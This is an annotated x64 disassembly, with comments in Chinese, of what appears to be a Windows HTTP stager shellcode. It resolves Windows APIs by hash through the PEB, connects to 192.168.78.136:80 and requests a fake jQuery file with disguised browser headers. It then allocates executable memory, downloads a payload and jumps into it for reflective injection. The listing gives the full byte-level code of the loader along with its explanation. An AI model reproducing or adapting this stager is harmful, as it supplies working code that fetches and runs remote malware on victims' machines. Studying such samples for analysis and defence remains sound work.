00000283FDC10000 | FC                       | cld                                            | df=0
00000283FDC10001 | 48:83E4 F0               | and rsp,FFFFFFFFFFFFFFF0                       | rsp最后4位设为0,确保栈大小为16字节对齐
00000283FDC10005 | E8 C8000000              | call 283FDC100D2                               | rsp: 00000283FDC1000A
00000283FDC1000A | 41:51                    | push r9                                        | rsp: 0 wininet 00000283FDC100EF r9
00000283FDC1000C | 41:50                    | push r8                                        | rsp: 0 wininet 00000283FDC100EF r9 r8
00000283FDC1000E | 52                       | push rdx                                       | rsp: 0 wininet 00000283FDC100EF r9 r8 rdx
00000283FDC1000F | 51                       | push rcx                                       | rsp: 0 wininet 00000283FDC100EF  r9 r8 rdx rcx
00000283FDC10010 | 56                       | push rsi                                       | rsp: 0 wininet 00000283FDC100EF  r9 r8 rdx rcx rsi
00000283FDC10011 | 48:31D2                  | xor rdx,rdx                                    | rdx=0
00000283FDC10014 | 6548:8B52 60             | mov rdx,qword ptr gs:[rdx+60]                  | rdx = PPEB
00000283FDC10019 | 48:8B52 18               | mov rdx,qword ptr ds:[rdx+18]                  | rdx = PPEB_LDR_DATA
00000283FDC1001D | 48:8B52 20               | mov rdx,qword ptr ds:[rdx+20]                  | rdx = PPEB_LDR_DATA->InMemoryOrderModuleList.Flink
00000283FDC10021 | 48:8B72 50               | mov rsi,qword ptr ds:[rdx+50]                  | rsi = LDR_DATA_TABLE_ENTRY.BaseDLLName.Buffer
00000283FDC10025 | 48:0FB74A 4A             | movzx rcx,word ptr ds:[rdx+4A]                 | rcx = LDR_DATA_TABLE_ENTRY.BaseDLLName.MaximumLength
00000283FDC1002A | 4D:31C9                  | xor r9,r9                                      | r9 = 0
00000283FDC1002D | 48:31C0                  | xor rax,rax                                    | rax = 0
00000283FDC10030 | AC                       | lodsb                                          | al = [si], si++ 读取1字节
00000283FDC10031 | 3C 61                    | cmp al,61                                      | al == a 判断字节是不是小写字母
00000283FDC10033 | 7C 02                    | jl 283FDC10037                                 | al < a --> jmp 283FDC10037 不是小写字母则跳过
00000283FDC10035 | 2C 20                    | sub al,20                                      | al = al - 32 转换为大写字母
00000283FDC10037 | 41:C1C9 0D               | ror r9d,D                                      | r9d >> 13,哈希运算
00000283FDC1003B | 41:01C1                  | add r9d,eax                                    | r9d += eax
00000283FDC1003E | E2 ED                    | loop 283FDC1002D                               | rcx--
00000283FDC10040 | 52                       | push rdx                                       | rsp: 0 wininet 00000283FDC100EF  r9 r8 rdx rcx rsi rdx
00000283FDC10041 | 41:51                    | push r9                                        | rsp: 0 wininet 00000283FDC100EF  r9 r8 rdx rcx rsi rdx r9
00000283FDC10043 | 48:8B52 20               | mov rdx,qword ptr ds:[rdx+20]                  | rdx = LDR_DATA_TABLE_ENTRY.DllBase
00000283FDC10047 | 8B42 3C                  | mov eax,dword ptr ds:[rdx+3C]                  | eax = IMAGE_DOS_HEADER.e_lfanew
00000283FDC1004A | 48:01D0                  | add rax,rdx                                    | rax = IMAGE_NT_HEADERS
00000283FDC1004D | 66:8178 18 0B02          | cmp word ptr ds:[rax+18],20B                   | IMAGE_OPTIONAL_HEADER32 == 020B(x64)
00000283FDC10053 | 75 72                    | jne 283FDC100C7                                | 如果不是x64则跳转到283FDC100C7
00000283FDC10055 | 8B80 88000000            | mov eax,dword ptr ds:[rax+88]                  | eax = IMAGE_DATA_DIRECTORY[0]
00000283FDC1005B | 48:85C0                  | test rax,rax                                   | eax == 0
00000283FDC1005E | 74 67                    | je 283FDC100C7                                 | 如果eax=0则跳转到283FDC100C7
00000283FDC10060 | 48:01D0                  | add rax,rdx                                    | rax = PIMAGE_EXPORT_DIRECTORY
00000283FDC10063 | 50                       | push rax                                       | rsp: 0 wininet 00000283FDC100EF  r9 r8 rdx rcx rsi rdx r9 rax
00000283FDC10064 | 8B48 18                  | mov ecx,dword ptr ds:[rax+18]                  | ecx = NumberOfNames
00000283FDC10067 | 44:8B40 20               | mov r8d,dword ptr ds:[rax+20]                  | r8d = AddressOfNamesRVA
00000283FDC1006B | 49:01D0                  | add r8,rdx                                     | r8 =  AddressOfNames
00000283FDC1006E | E3 56                    | jrcxz 283FDC100C6                              | rcx == 0 -> 283FDC100C6
00000283FDC10070 | 48:FFC9                  | dec rcx                                        | rcx --
00000283FDC10073 | 41:8B3488                | mov esi,dword ptr ds:[r8+rcx*4]                | esi = AddressOfNames[rcx]RVA
00000283FDC10077 | 48:01D6                  | add rsi,rdx                                    | rsi = AddressOfNames[rcx]
00000283FDC1007A | 4D:31C9                  | xor r9,r9                                      | r9 = 0
00000283FDC1007D | 48:31C0                  | xor rax,rax                                    | rax = 0
00000283FDC10080 | AC                       | lodsb                                          | al = [si], si++ 读取1字节
00000283FDC10081 | 41:C1C9 0D               | ror r9d,D                                      | r9d >> 13,哈希运算
00000283FDC10085 | 41:01C1                  | add r9d,eax                                    | r9d += eax
00000283FDC10088 | 38E0                     | cmp al,ah                                      | al == ah 判断读取的字符串是否为0
00000283FDC1008A | 75 F1                    | jne 283FDC1007D                                | 如果al != 0 则跳转到283FDC1007D
00000283FDC1008C | 4C:034C24 08             | add r9,qword ptr ss:[rsp+8]                    | r9 + = rsp+8 当前函数哈希值+当前DLL哈希值
00000283FDC10091 | 45:39D1                  | cmp r9d,r10d                                   | r9 == r10 判断是否找到对应DLL的对应函数
00000283FDC10094 | 75 D8                    | jne 283FDC1006E                                | r9d != r10d -> jmp 283FDC1006E
00000283FDC10096 | 58                       | pop rax                                        | rax = PIMAGE_EXPORT_DIRECTORY  rsp: 0 wininet 00000283FDC100EF  r9 r8 rdx rcx rsi rdx r9
00000283FDC10097 | 44:8B40 24               | mov r8d,dword ptr ds:[rax+24]                  | r8d = AddressOfNameOrdinalsRVA
00000283FDC1009B | 49:01D0                  | add r8,rdx                                     | r8 = AddressOfNameOrdinals
00000283FDC1009E | 6641:8B0C48              | mov cx,word ptr ds:[r8+rcx*2]                  | cx = AddressOfNameOrdinals[rcx] 函数对应的序号
00000283FDC100A3 | 44:8B40 1C               | mov r8d,dword ptr ds:[rax+1C]                  | r8d = AddressOfFunctionsRVA
00000283FDC100A7 | 49:01D0                  | add r8,rdx                                     | r8 =  AddressOfFunctions
00000283FDC100AA | 41:8B0488                | mov eax,dword ptr ds:[r8+rcx*4]                | eax =  AddressOfFunctions[rcx] 函数RVA
00000283FDC100AE | 48:01D0                  | add rax,rdx                                    | rax = 函数地址
00000283FDC100B1 | 41:58                    | pop r8                                         | rsp: 0 wininet 00000283FDC100EF  r9 r8 rdx rcx rsi rdx   r8=r9
00000283FDC100B3 | 41:58                    | pop r8                                         | rsp: 0 wininet 00000283FDC100EF  r9 r8 rdx rcx rsi r8 = rdx
00000283FDC100B5 | 5E                       | pop rsi                                        | rsp: 0 wininet 00000283FDC100EF  r9 r8 rdx rcx 
00000283FDC100B6 | 59                       | pop rcx                                        | rsp: 0 wininet 00000283FDC100EF  r9 r8 rdx 
00000283FDC100B7 | 5A                       | pop rdx                                        | rsp: 0 wininet 00000283FDC100EF  r9 r8 
00000283FDC100B8 | 41:58                    | pop r8                                         | rsp: 0 wininet 00000283FDC100EF  r9 
00000283FDC100BA | 41:59                    | pop r9                                         | rsp: 0 wininet 00000283FDC100EF  
00000283FDC100BC | 41:5A                    | pop r10                                        | r10 = 00000283FDC100EF          rsp: 0 wininet 
00000283FDC100BE | 48:83EC 20               | sub rsp,20                                     | rsp -= 32 x64调用win32函数需要预留32字节的栈空间，影子空间 rsp: 0 wininet 0 0 0 0
00000283FDC100C2 | 41:52                    | push r10                                       | 调用LoadLibraryA函数返回地址 = r10 rsp: 0 wininet 0 0 0 0 00000283FDC100EF
00000283FDC100C4 | FFE0                     | jmp rax                                        | jmp LoadLibraryA -> 00000283FDC100EF
00000283FDC100C6 | 58                       | pop rax                                        |
00000283FDC100C7 | 41:59                    | pop r9                                         |
00000283FDC100C9 | 5A                       | pop rdx                                        |
00000283FDC100CA | 48:8B12                  | mov rdx,qword ptr ds:[rdx]                     |
00000283FDC100CD | E9 4FFFFFFF              | jmp 283FDC10021                                |
00000283FDC100D2 | 5D                       | pop rbp                                        | rbp = 00000283FDC1000A rsp: null
00000283FDC100D3 | 6A 00                    | push 0                                         | rsp: 0
00000283FDC100D5 | 49:BE 77696E696E657400   | mov r14,74656E696E6977                         | r14: wininet\x00
00000283FDC100DF | 41:56                    | push r14                                       | rsp: 0 wininet
00000283FDC100E1 | 49:89E6                  | mov r14,rsp                                    | r14 = rsp
00000283FDC100E4 | 4C:89F1                  | mov rcx,r14                                    | rcx = rsp
00000283FDC100E7 | 41:BA 4C772607           | mov r10d,726774C                               | r10 = 0726774C 函数哈希值
00000283FDC100ED | FFD5                     | call rbp                                       | rsp = 00000283FDC100EF rsp: 0 wininet 00000283FDC100EF
00000283FDC100EF | 48:31C9                  | xor rcx,rcx                                    | rax = hWinnet rcx = 0 rsp: 0 wininet 00000283FDC100EF 0 0 0
00000283FDC100F2 | 48:31D2                  | xor rdx,rdx                                    | rdx = 0
00000283FDC100F5 | 4D:31C0                  | xor r8,r8                                      | r8 = 0
00000283FDC100F8 | 4D:31C9                  | xor r9,r9                                      | r9 = 0
00000283FDC100FB | 41:50                    | push r8                                        | rsp: 0 wininet 00000283FDC100EF 0 0 0 0
00000283FDC100FD | 41:50                    | push r8                                        | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0
00000283FDC100FF | 41:BA 3A5679A7           | mov r10d,A779563A                              | r10d = A779563A
00000283FDC10105 | FFD5                     | call rbp                                       | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 00000283FDC10107 每call一次rsp就增加32字节影子空间
00000283FDC10107 | EB 73                    | jmp 283FDC1017C                                | rax = InternetOpenA句柄 rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0
00000283FDC10109 | 5A                       | pop rdx                                        | rdx = 192.168.78.136  rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0
00000283FDC1010A | 48:89C1                  | mov rcx,rax                                    | rcx = InternetOpenA句柄
00000283FDC1010D | 41:B8 50000000           | mov r8d,50                                     | r8d = 80
00000283FDC10113 | 4D:31C9                  | xor r9,r9                                      | r9 = 0
00000283FDC10116 | 41:51                    | push r9                                        | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0
00000283FDC10118 | 41:51                    | push r9                                        | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0
00000283FDC1011A | 6A 03                    | push 3                                         | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3
00000283FDC1011C | 41:51                    | push r9                                        | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0
00000283FDC1011E | 41:BA 57899FC6           | mov r10d,C69F8957                              | r10d = C69F8957 
00000283FDC10124 | FFD5                     | call rbp                                       | call InternetConnectA
00000283FDC10126 | EB 59                    | jmp 283FDC10181                                | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0
00000283FDC10128 | 5B                       | pop rbx                                        | rbx = "/jquery-3.3.2.slim.min.js"
00000283FDC10129 | 48:89C1                  | mov rcx,rax                                    | rcx = InternetConnectA句柄
00000283FDC1012C | 48:31D2                  | xor rdx,rdx                                    | rdx = 0 lpszVerb
00000283FDC1012F | 49:89D8                  | mov r8,rbx                                     | r8 = "jquery-3.3.2.slim.min.js" lpszObjectName
00000283FDC10132 | 4D:31C9                  | xor r9,r9                                      | r9 = 0 lpszVersion
00000283FDC10135 | 52                       | push rdx                                       | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0(dwContext)
00000283FDC10136 | 68 00024084              | push FFFFFFFF84400200                          | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200(dwFlags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI)
00000283FDC1013B | 52                       | push rdx                                       | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200 0(lplpszAcceptTypes)
00000283FDC1013C | 52                       | push rdx                                       | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200 0 0(lpszReferrer)
00000283FDC1013D | 41:BA EB552E3B           | mov r10d,3B2E55EB                              | r10d = 3B2E55EB
00000283FDC10143 | FFD5                     | call rbp                                       | call HttpOpenRequestA 
00000283FDC10145 | 48:89C6                  | mov rsi,rax                                    | rsi = HttpOpenRequestA句柄 rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200 0 0 0 0 0 0
00000283FDC10148 | 48:83C3 50               | add rbx,50                                     | rbx = 请求头(Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Referer: http://code.jquery.com/ Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko)
00000283FDC1014C | 6A 0A                    | push A                                         | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200 0 0 0 0 0 0 A
00000283FDC1014E | 5F                       | pop rdi                                        | rdi = A(请求失败重试次数)  rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200 0 0 0 0 0 0
00000283FDC1014F | 48:89F1                  | mov rcx,rsi                                    | rcx = HttpOpenRequestA句柄 hRequest
00000283FDC10152 | 48:89DA                  | mov rdx,rbx                                    | rdx = 请求头 lpszHeaders
00000283FDC10155 | 49:C7C0 FFFFFFFF         | mov r8,FFFFFFFFFFFFFFFF                        | r8 = -1 dwHeadersLength
00000283FDC1015C | 4D:31C9                  | xor r9,r9                                      | r9 = 0 dwOptionalLength
00000283FDC1015F | 52                       | push rdx                                       | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200 0 0 0 0 0 0 请求头
00000283FDC10160 | 52                       | push rdx                                       | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200 0 0 0 0 0 0 请求头 请求头
00000283FDC10161 | 41:BA 2D06187B           | mov r10d,7B18062D                              | r10d = 7B18062D
00000283FDC10167 | FFD5                     | call rbp                                       | call  HttpSendRequestA
00000283FDC10169 | 85C0                     | test eax,eax                                   | eax == 0 rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200 0 0 0 0 0 0 请求头 请求头 0 0 0 0
00000283FDC1016B | 0F85 9D010000            | jne 283FDC1030E                                | if eax!=0 -> jmp 283FDC1030E
00000283FDC10171 | 48:FFCF                  | dec rdi                                        | rdi = 9
00000283FDC10174 | 0F84 8C010000            | je 283FDC10306                                 | jmp 283FDC10306 重试次数为0则调用ExitProcess
00000283FDC1017A | EB D3                    | jmp 283FDC1014F                                | 重新发送请求
00000283FDC1017C | E9 E4010000              | jmp 283FDC10365                                |
00000283FDC10181 | E8 A2FFFFFF              | call 283FDC10128                               |
00000283FDC10186 | 2F                       | ???                                            |请求路径
00000283FDC10187 | 6A 71                    | push 71                                        |
00000283FDC10189 | 75 65                    | jne 283FDC101F0                                |
00000283FDC1018B | 72 79                    | jb 283FDC10206                                 |
00000283FDC1018D | 2D 332E332E              | sub eax,2E332E33                               |
00000283FDC10192 | 322E                     | xor ch,byte ptr ds:[rsi]                       |
00000283FDC10194 | 73 6C                    | jae 283FDC10202                                |
00000283FDC10196 | 696D 2E 6D696E2E         | imul ebp,dword ptr ss:[rbp+2E],2E6E696D        |
00000283FDC1019D | 6A 73                    | push 73                                        |
00000283FDC1019F | 0056 A3                  | add byte ptr ds:[rsi-5D],dl                    |
00000283FDC101A2 | 40:3C 60                 | cmp al,60                                      | 
00000283FDC101A5 | B8 DD60712C              | mov eax,2C7160DD                               |
00000283FDC101AA | 27                       | ???                                            |
00000283FDC101AB | D198 75743702            | rcr dword ptr ds:[rax+2377475],1               |
00000283FDC101B1 | E4 8C                    | in al,8C                                       |
00000283FDC101B3 | 1215 76F9FA6D            | adc dl,byte ptr ds:[2846BBBFB2F]               |
00000283FDC101B9 | 848B 5FB51480            | test byte ptr ds:[rbx-7FEB4AA1],cl             |
00000283FDC101BF | 67:1D 65DE6EEF           | sbb eax,EF6EDE65                               |
00000283FDC101C5 | 65:0BB6 974E4BF5         | or esi,dword ptr gs:[rsi-AB4B169]              |
00000283FDC101CC | 56                       | push rsi                                       |
00000283FDC101CD | 05 20A08BAB              | add eax,AB8BA020                               |
00000283FDC101D2 | 55                       | push rbp                                       |
00000283FDC101D3 | 0B7B 00                  | or edi,dword ptr ds:[rbx]                      |
00000283FDC101D6 | 41:6363 65               | movsxd esp,dword ptr ds:[r11+65]               |请求头
00000283FDC101DA | 70 74                    | jo 283FDC10250                                 |
00000283FDC101DC | 3A20                     | cmp ah,byte ptr ds:[rax]                       |
00000283FDC101DE | 74 65                    | je 283FDC10245                                 |
00000283FDC101E0 | 78 74                    | js 283FDC10256                                 |
00000283FDC101E2 | 2F                       | ???                                            |
00000283FDC101E3 | 68 746D6C2C              | push 2C6C6D74                                  |
00000283FDC101E8 | 61                       | ???                                            |
00000283FDC101E9 | 70 70                    | jo 283FDC1025B                                 |
00000283FDC101EB | 6C                       | insb                                           |
00000283FDC101EC | 6963 61 74696F6E         | imul esp,dword ptr ds:[rbx+61],6E6F6974        |
00000283FDC101F3 | 2F                       | ???                                            |
00000283FDC101F4 | 78 68                    | js 283FDC1025E                                 |
00000283FDC101F6 | 74 6D                    | je 283FDC10265                                 |
00000283FDC101F8 | 6C                       | insb                                           |
00000283FDC101F9 | 2B78 6D                  | sub edi,dword ptr ds:[rax+6D]                  |
00000283FDC101FC | 6C                       | insb                                           |
00000283FDC101FD | 2C 61                    | sub al,61                                      |
00000283FDC101FF | 70 70                    | jo 283FDC10271                                 |
00000283FDC10201 | 6C                       | insb                                           |
00000283FDC10202 | 6963 61 74696F6E         | imul esp,dword ptr ds:[rbx+61],6E6F6974        |
00000283FDC10209 | 2F                       | ???                                            |
00000283FDC1020A | 78 6D                    | js 283FDC10279                                 |
00000283FDC1020C | 6C                       | insb                                           |
00000283FDC1020D | 3B71 3D                  | cmp esi,dword ptr ds:[rcx+3D]                  |
00000283FDC10210 | 302E                     | xor byte ptr ds:[rsi],ch                       |
00000283FDC10212 | 392C2A                   | cmp dword ptr ds:[rdx+rbp],ebp                 |
00000283FDC10215 | 2F                       | ???                                            |
00000283FDC10216 | 2A3B                     | sub bh,byte ptr ds:[rbx]                       |
00000283FDC10218 | 71 3D                    | jno 283FDC10257                                |
00000283FDC1021A | 302E                     | xor byte ptr ds:[rsi],ch                       |
00000283FDC1021C | 380D 0A416363            | cmp byte ptr ds:[2846124432C],cl               |
00000283FDC10222 | 65:70 74                 | jo 283FDC10299                                 |
00000283FDC10225 | 2D 4C616E67              | sub eax,676E614C                               |
00000283FDC1022A | 75 61                    | jne 283FDC1028D                                |
00000283FDC1022C | 6765:3A20                | cmp ah,byte ptr gs:[eax]                       |
00000283FDC10230 | 65:6E                    | outsb                                          |
00000283FDC10232 | 2D 55532C65              | sub eax,652C5355                               |
00000283FDC10237 | 6E                       | outsb                                          |
00000283FDC10238 | 3B71 3D                  | cmp esi,dword ptr ds:[rcx+3D]                  |
00000283FDC1023B | 302E                     | xor byte ptr ds:[rsi],ch                       |
00000283FDC1023D | 35 0D0A5265              | xor eax,65520A0D                               |
00000283FDC10242 | 6665:72 65               | jb 283FDC102AB                                 |
00000283FDC10246 | 72 3A                    | jb 283FDC10282                                 |
00000283FDC10248 | 2068 74                  | and byte ptr ds:[rax+74],ch                    |
00000283FDC1024B | 74 70                    | je 283FDC102BD                                 |
00000283FDC1024D | 3A2F                     | cmp ch,byte ptr ds:[rdi]                       |
00000283FDC1024F | 2F                       | ???                                            |
00000283FDC10250 | 636F 64                  | movsxd ebp,dword ptr ds:[rdi+64]               |
00000283FDC10253 | 652E:6A 71               | push 71                                        |
00000283FDC10257 | 75 65                    | jne 283FDC102BE                                |
00000283FDC10259 | 72 79                    | jb 283FDC102D4                                 |
00000283FDC1025B | 2E:636F 6D               | movsxd ebp,dword ptr ds:[rdi+6D]               |
00000283FDC1025F | 2F                       | ???                                            |
00000283FDC10260 | 0D 0A416363              | or eax,6363410A                                |
00000283FDC10265 | 65:70 74                 | jo 283FDC102DC                                 |
00000283FDC10268 | 2D 456E636F              | sub eax,6F636E45                               |
00000283FDC1026D | 64:696E 67 3A20677A      | imul ebp,dword ptr fs:[rsi+67],7A67203A        |
00000283FDC10275 | 6970 2C 20646566         | imul esi,dword ptr ds:[rax+2C],66656420        |
00000283FDC1027C | 6C                       | insb                                           |
00000283FDC1027D | 61                       | ???                                            |
00000283FDC1027E | 74 65                    | je 283FDC102E5                                 |
00000283FDC10280 | 0D 0A557365              | or eax,6573550A                                |
00000283FDC10285 | 72 2D                    | jb 283FDC102B4                                 |
00000283FDC10287 | 416765:6E                | outsb                                          |
00000283FDC1028B | 74 3A                    | je 283FDC102C7                                 |
00000283FDC1028D | 204D 6F                  | and byte ptr ss:[rbp+6F],cl                    |
00000283FDC10290 | 7A 69                    | jp 283FDC102FB                                 |
00000283FDC10292 | 6C                       | insb                                           |
00000283FDC10293 | 6C                       | insb                                           |
00000283FDC10294 | 61                       | ???                                            |
00000283FDC10295 | 2F                       | ???                                            |
00000283FDC10296 | 35 2E302028              | xor eax,2820302E                               |
00000283FDC1029B | 57                       | push rdi                                       | 
00000283FDC1029C | 696E 64 6F777320         | imul ebp,dword ptr ds:[rsi+64],2073776F        |
00000283FDC102A3 | 4E:54                    | push rsp                                       |
00000283FDC102A5 | 2036                     | and byte ptr ds:[rsi],dh                       |
00000283FDC102A7 | 2E:333B                  | xor edi,dword ptr ds:[rbx]                     |
00000283FDC102AA | 205472 69                | and byte ptr ds:[rdx+rsi*2+69],dl              |
00000283FDC102AE | 6465:6E                  | outsb                                          |
00000283FDC102B1 | 74 2F                    | je 283FDC102E2                                 |
00000283FDC102B3 | 37                       | ???                                            |
00000283FDC102B4 | 2E:303B                  | xor byte ptr ds:[rbx],bh                       |
00000283FDC102B7 | 2072 76                  | and byte ptr ds:[rdx+76],dh                    |
00000283FDC102BA | 3A31                     | cmp dh,byte ptr ds:[rcx]                       |
00000283FDC102BC | 312E                     | xor dword ptr ds:[rsi],ebp                     |
00000283FDC102BE | 3029                     | xor byte ptr ds:[rcx],ch                       |
00000283FDC102C0 | 206C69 6B                | and byte ptr ds:[rcx+rbp*2+6B],ch              |
00000283FDC102C4 | 65:2047 65               | and byte ptr gs:[rdi+65],al                    |
00000283FDC102C8 | 636B 6F                  | movsxd ebp,dword ptr ds:[rbx+6F]               |
00000283FDC102CB | 0D 0A008DF2              | or eax,F28D000A                                |
00000283FDC102D0 | 129E FDFD2F49            | adc bl,byte ptr ds:[rsi+492FFDFD]              |
00000283FDC102D6 | D5                       | ???                                            |
00000283FDC102D7 | 3C 6F                    | cmp al,6F                                      | 
00000283FDC102D9 | C559150D 2CA2D9DB        | vunpckhpd xmm9,xmm4,xmmword ptr ds:[283D99     |
00000283FDC102E1 | 37                       | ???                                            |
00000283FDC102E2 | 0BB2 D1303360            | or esi,dword ptr ds:[rdx+603330D1]             |
00000283FDC102E8 | 9D                       | popfq                                          |
00000283FDC102E9 | 15 E92E8B22              | adc eax,228B2EE9                               |
00000283FDC102EE | 91                       | xchg ecx,eax                                   |
00000283FDC102EF | 5F                       | pop rdi                                        | 
00000283FDC102F0 | 93                       | xchg ebx,eax                                   |
00000283FDC102F1 | 44                       | ???                                            |
00000283FDC102F2 | 4A                       | ???                                            |
00000283FDC102F3 | 27                       | ???                                            |
00000283FDC102F4 | 21746E F3                | and dword ptr ds:[rsi+rbp*2-D],esi             |
00000283FDC102F8 | 3D 88F3EAEF              | cmp eax,EFEAF388                               |
00000283FDC102FD | A8 5C                    | test al,5C                                     |
00000283FDC102FF | 6D                       | insd                                           |
00000283FDC10300 | 2846 67                  | sub byte ptr ds:[rsi+67],al                    |
00000283FDC10303 | AC                       | lodsb                                          |
00000283FDC10304 | F2:00                    | add byte ptr ds:[rcx-42],al                    | r
00000283FDC10306 | 41:BE F0B5A256           | mov r14d,56A2B5F0                              | ExitProcess
00000283FDC1030C | FFD5                     | call rbp                                       | 
00000283FDC1030E | 48:31C9                  | xor rcx,rcx                                    | rcx = 0 lpAddress
00000283FDC10311 | BA 00004000              | mov edx,400000                                 | edx = 0x400000 dwSize
00000283FDC10316 | 41:B8 00100000           | mov r8d,1000                                   | r8d = 0x1000 flAllocationType=MEM_COMMIT
00000283FDC1031C | 41:B9 40000000           | mov r9d,40                                     | r9d = 0x40 flProtect=PAGE_EXECUTE_READWRITE
00000283FDC10322 | 41:BA 58A453E5           | mov r10d,E553A458                              | r10d = 0xE553A458
00000283FDC10328 | FFD5                     | call rbp                                       | call VirtualAlloc
00000283FDC1032A | 48:93                    | xchg rbx,rax                                   | rbx=lpAddress rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200 0 0 0 0 0 0 请求头 请求头 0 0 0 0 0 0 0 0
00000283FDC1032C | 53                       | push rbx                                       | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200 0 0 0 0 0 0 请求头 请求头 0 0 0 0 0 0 0 0  lpAddress
00000283FDC1032D | 53                       | push rbx                                       | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200 0 0 0 0 0 0 请求头 请求头 0 0 0 0 0 0 0 0  lpAddress 读取字节数
00000283FDC1032E | 48:89E7                  | mov rdi,rsp                                    | rdi = rsp
00000283FDC10331 | 48:89F1                  | mov rcx,rsi                                    | rcx = rsi = HttpOpenRequestA句柄
00000283FDC10334 | 48:89DA                  | mov rdx,rbx                                    | rdx = rbx = lpAddress
00000283FDC10337 | 41:B8 00200000           | mov r8d,2000                                   | r8d = 0x2000 dwNumberOfBytesToRead
00000283FDC1033D | 49:89F9                  | mov r9,rdi                                     | r9 = rdi lpdwNumberOfBytesRead
00000283FDC10340 | 41:BA 129689E2           | mov r10d,E2899612                              | r10d = 0xE2899612
00000283FDC10346 | FFD5                     | call rbp                                       | call InternetReadFile
00000283FDC10348 | 48:83C4 20               | add rsp,20                                     | 清理影子空间,rsp不变
00000283FDC1034C | 85C0                     | test eax,eax                                   | eax == 0
00000283FDC1034E | 74 B6                    | je 1E551A80306                                 | if eax= 0 jmp 1E551A80306 
00000283FDC10350 | 66:8B07                  | mov ax,word ptr ds:[rdi]                       | ax = 读取字节数
00000283FDC10353 | 48:01C3                  | add rbx,rax                                    | rbx += 0x读取字节数
00000283FDC10356 | 85C0                     | test eax,eax                                   | 读取字节数 == 0
00000283FDC10358 | 75 D7                    | jne 1E551A80331                                | 不为0继续读取
00000283FDC1035A | 58                       | pop rax                                        | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200 0 0 0 0 0 0 请求头 请求头 0 0 0 0 0 0 0 0  lpAddress
00000283FDC1035B | 58                       | pop rax                                        | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200 0 0 0 0 0 0 请求头 请求头 0 0 0 0 0 0 0 0 
00000283FDC1035C | 58                       | pop rax                                        | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200 0 0 0 0 0 0 请求头 请求头 0 0 0 0 0 0 0 
00000283FDC1035D | 48:05 AF0F0000           | add rax,FAF                                    | rax += 0xFAF 反射式注入的入口地址
00000283FDC10363 | 50                       | push rax                                       | rsp: 0 wininet 00000283FDC100EF 0 0 0 0 0 0 0 0 0 0 0 3 0 0 0 0 0 0 FFFFFFFF84400200 0 0 0 0 0 0 请求头 请求头 0 0 0 0 0 0 0 rax
00000283FDC10364 | C3                       | ret                                            | rax为返回地址,shellcode执行完后跳转到rax开始加载主体代码
00000283FDC10365 | E8 9FFDFFFF              | call 283FDC10109                               | IP地址
00000283FDC1036A | 3139                     | xor dword ptr ds:[rcx],edi                     |
00000283FDC1036C | 322E                     | xor ch,byte ptr ds:[rsi]                       |
00000283FDC1036E | 3136                     | xor dword ptr ds:[rsi],esi                     |
00000283FDC10370 | 382E                     | cmp byte ptr ds:[rsi],ch                       |
00000283FDC10372 | 37                       | ???                                            |
00000283FDC10373 | 382E                     | cmp byte ptr ds:[rsi],ch                       |
00000283FDC10375 | 3133                     | xor dword ptr ds:[rbx],esi                     |
00000283FDC10377 | 36:0005 F5E10000         | add byte ptr ds:[283FDC1E573],al               |
